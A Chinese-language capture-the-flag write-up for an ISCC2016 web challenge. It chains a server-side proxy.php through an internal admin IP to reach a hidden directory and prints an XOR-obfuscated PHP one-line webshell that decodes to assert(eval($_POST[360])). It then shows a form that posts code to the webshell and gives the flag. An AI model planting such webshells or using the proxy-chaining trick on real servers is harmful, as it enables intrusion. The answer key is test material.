## 描述

小明入侵了一台web服务器并上传了一句话木马，但是，管理员修补了漏洞，更改了权限。更重要的是：他忘记了木马的密码！你能帮助他夺回控制权限吗？

关卡入口：http://web.jarvisoj.com:32782/

题目来源:ISCC2016

Hint1: 本题已修复，没做出来的请重新开始做题。

## 题解

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
	<title>ISCC 2016</title>
	<div class="container">
		<img src="proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg" alt="">
		
		<p><a href="admin">管理员登录</a></p>
	</div>
</head>
<body>
	
</body>
</html>
```

图片我保存到了 [assets/proxy.jpg](./assets/proxy.jpg)，010 Editor 看了下没发现啥奇怪的东西和代码。headers 也没啥奇怪的东西。先挂着御剑扫一下吧。

再来看一下 `/admin`，直接 403 Forbidden，弹出了个 `you are not admin!`。

```html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /admin/
on this server.</p>
<script>alert('you are not admin!')</script>
<!--<script>alert('admin ip is 202.5.19.128')</script>-->
</body></html>
```

发现有个 `202.5.19.128` 的 ip，`nmap` 扫了一下，发现了

```html
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
53/tcp  open  domain
80/tcp  open  http
111/tcp open  rpcbind
443/tcp open  https
```

先看看 80 口吧，也是一个 403 Forbidden，但是给出了一些多余信息

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="zh-cn" xml:lang="zh-cn">
<head>
<title>禁止访问！</title>
<link rev="made" href="mailto:you@example.com" />
<style type="text/css"><!--/*--><![CDATA[/*><!--*/ 
    body { color: #000000; background-color: #FFFFFF; }
    a:link { color: #0000CC; }
    p, address {margin-left: 3em;}
    span {font-size: smaller;}
/*]]>*/--></style>
</head>

<body>
<h1>禁止访问！</h1>
<p>
    您无权访问所请求的目录。
    这是由于没有主页或该目录不允许被读取导致的。
</p>
<p>
如果您认为这是一个服务器错误，请联系<a href="mailto:you@example.com">网站管理员</a>。

</p>

<h2>Error 403</h2>
<address>
  <a href="/">202.5.19.128</a><br />
  <span>Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/7.3.0 mod_perl/2.0.8-dev Perl/v5.16.3</span>
</address>
</body>
</html>
```

暂时没发现啥问题。试试 `ssh`，好把不懂密码。

之前的御剑扫完了，发现之前漏看了一个 `proxy.php`，尝试访问一下是不是可以注入。

http://web.jarvisoj.com:32782/proxy.php?url=http://www.baidu.com

发现这玩意并不是给你个跳转（status code 是 200），而是直接服务器上打开网页然后再传给我们，这样是不是就有权限访问刚刚我们没权限访问的东西了？试试。

http://web.jarvisoj.com:32782/proxy.php?url=http://web.jarvisoj.com:32782/admin

没用。

http://web.jarvisoj.com:32782/proxy.php?url=202.5.19.128

居然 302 跳转到了

http://web.jarvisoj.com:32782/index.php?url=http://8080av.com

（这个域名让人浮想联翩啊

但是这个域名似乎是无效的，ping 都出不来 ip，所以应该是个假链接。

用御剑扫一下 202.5.19.128 看看能发现啥，啥也没有。

尝试用那个 proxy 来访问这个

http://web.jarvisoj.com:32782/proxy.php?url=202.5.19.128/proxy.php

woc 居然得到了

```html
<br />
<b>Notice</b>:  Undefined offset: 2 in <b>/opt/lampp/htdocs/proxy.php</b> on line <b>53</b><br />
invalid request
```

而不是禁止访问！接着尝试

http://web.jarvisoj.com:32782/proxy.php?url=202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin

依然没权限

折腾了一下，真的不会，去查题解吧。

艹，之前多加一个斜杠

http://web.jarvisoj.com:32782/proxy.php?url=202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/

就能得到

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
	<title>ISCC 2016</title>
	<h1>YOU'RE CLOOSING!</h1>
</head>
<body>
	
</body>
</html>
```

的提示。然后居然要加个 robots.txt 有惊喜。。。。。

http://web.jarvisoj.com:32782/proxy.php?url=202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/robots.txt

得到了

```
User-agent: *
Disallow:trojan.php
Disallow:trojan.php.txt
```

接着来试试

http://web.jarvisoj.com:32782/proxy.php?url=202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/trojan.php

没用，应该是要加参数才行，试试那个 txt 的看看源码，得到

```php
<?php ${("#"^"|").("#"^"|")}=("!"^"`").("( "^"{").("("^"[").("~"^";").("|"^".").("*"^"~");${("#"^"|").("#"^"|")}(("-"^"H"). ("]"^"+"). ("["^":"). (","^"@"). ("}"^"U"). ("e"^"A"). ("("^"w").("j"^":"). ("i"^"&"). ("#"^"p"). (">"^"j"). ("!"^"z"). ("T"^"g"). ("e"^"S"). ("_"^"o"). ("?"^"b"). ("]"^"t"));?>
```

本机跑一下，发现其实是

```php
assert(eval($_POST[360]))
```

可以搞事情了，本地打开以下 html

```html
<form action="http://web.jarvisoj.com:32782/proxy.php?url=202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/trojan.php" method="POST" enctype="multipart/form-data">
    <input type="text" name="360" />
    <input type="submit" />
</form>
```

然后提交一个 `print(phpinfo())`

便得到了 flag

## 答案

CTF{fl4g_1s_my_c40d40_1s_n0t_y0urs}
